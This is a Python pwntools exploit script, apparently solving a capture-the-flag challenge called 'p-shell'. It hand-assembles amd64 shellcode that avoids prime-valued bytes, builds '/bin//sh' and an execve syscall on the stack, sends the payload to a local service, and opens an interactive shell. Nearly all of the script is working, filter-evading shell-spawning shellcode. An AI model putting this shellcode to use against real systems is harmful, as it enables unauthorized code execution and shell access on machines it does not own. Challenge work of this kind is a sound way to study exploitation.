from pwn import *
import sympy
import time

context.arch = "amd64"

# 0x2 0x3 0x5 0x7 0xb 0xd 0x11 0x13 0x17 0x1d 0x1f 0x25 0x29 0x2b 0x2f 0x35 0x3b 0x3d 0x43 0x47 0x49 0x4f 0x53 0x59 0x61 0x65 0x67 0x6b 0x6d 0x71 0x7f 0x83 0x89 0x8b 0x95 0x97 0x9d 0xa3 0xa7 0xad 0xb3 0xb5 0xbf 0xc1 0xc5 0xc7 0xd3 0xdf 0xe3 0xe5 0xe9 0xef 0xf1 0xfb

payload = asm('''
xor rsi, rsi
push rsi

mov rcx, 0x68732e2e6e69622e
push rcx

inc byte ptr [rsp]
inc byte ptr [rsp+4]

push 0
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
pop rsi
add byte ptr [rsp+rsi], 1

push rsp

pop rdi

xor rsi, rsi

push 58
add byte ptr [rsp], 1
pop rax
cdq
xor r12, r12
push r12
mov byte ptr [rsp], 0x0e
mov byte ptr [rsp+1], 0x04

inc byte ptr [rsp]
inc byte ptr [rsp+1]

call rsp
''')

print(payload)

# for i in range(0x1000):
#     if sympy.isprime(payload[i]):
#         print(f"Invalid shellcode at {i}: {payload[i]:#x}")

p = process('./p-shell')
p = remote('localhost', 18775)

print(payload)

pause()
p.sendlineafter(b'Input : ', payload)

p.interactive()